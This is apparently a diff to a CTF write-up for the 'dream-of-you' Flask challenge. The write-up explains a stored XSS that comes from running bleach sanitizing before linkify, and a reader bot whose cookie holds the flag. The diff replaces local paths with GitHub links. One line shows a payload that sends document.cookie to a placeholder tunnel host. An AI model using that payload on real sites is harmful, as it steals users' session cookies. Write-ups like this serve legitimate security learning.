@@ -4,7 +4,7 @@
 
 The challenge is a small Flask app where users can post stories containing a `[name]` placeholder. A reader bot visits a submitted story with a `flag` cookie set and types a name into the page.
 
-The bug is a stored XSS caused by this order of operations in [`dream-of-you/app/app.py`](/home/al/Downloads/CTF/tkbctf5_2026/web/dream-of-you/dream-of-you/app/app.py):
+The bug is a stored XSS caused by this order of operations in [`dream-of-you/app/app.py`](https://github.com/prathamgupta36/CTF-Writeups/blob/main/2026/tkbctf5_2026/web/dream-of-you/dream-of-you/app/app.py):
 
 1. Sanitize the story with `bleach.clean(...)`
 2. Auto-link URLs with `bleach.linkify(...)`
@@ -37,7 +37,7 @@ Important details:
 - `story` is inserted with `|safe`.
 - The bot sets a cookie named `flag`, visits `/read/<id>`, then clicks the name input and submits the form.
 
-The bot code in [`dream-of-you/reader_bot/app.js`](/home/al/Downloads/CTF/tkbctf5_2026/web/dream-of-you/dream-of-you/reader_bot/app.js) does:
+The bot code in [`dream-of-you/reader_bot/app.js`](https://github.com/prathamgupta36/CTF-Writeups/blob/main/2026/tkbctf5_2026/web/dream-of-you/dream-of-you/reader_bot/app.js) does:
 
 1. `page.setCookie({ name: "flag", value: flag, ... httpOnly: false })`
 2. `page.goto(targetUrl, ...)`
@@ -134,7 +134,7 @@ fetch('https://YOUR-TUNNEL/' + document.cookie)
 
 ## End-to-End Solve
 
-I wrote the exploit helper in [`exploit.py`](/home/al/Downloads/CTF/tkbctf5_2026/web/dream-of-you/exploit.py).
+I wrote the exploit helper in [`exploit.py`](https://github.com/prathamgupta36/CTF-Writeups/blob/main/2026/tkbctf5_2026/web/dream-of-you/exploit.py).
 
 Usage:
 
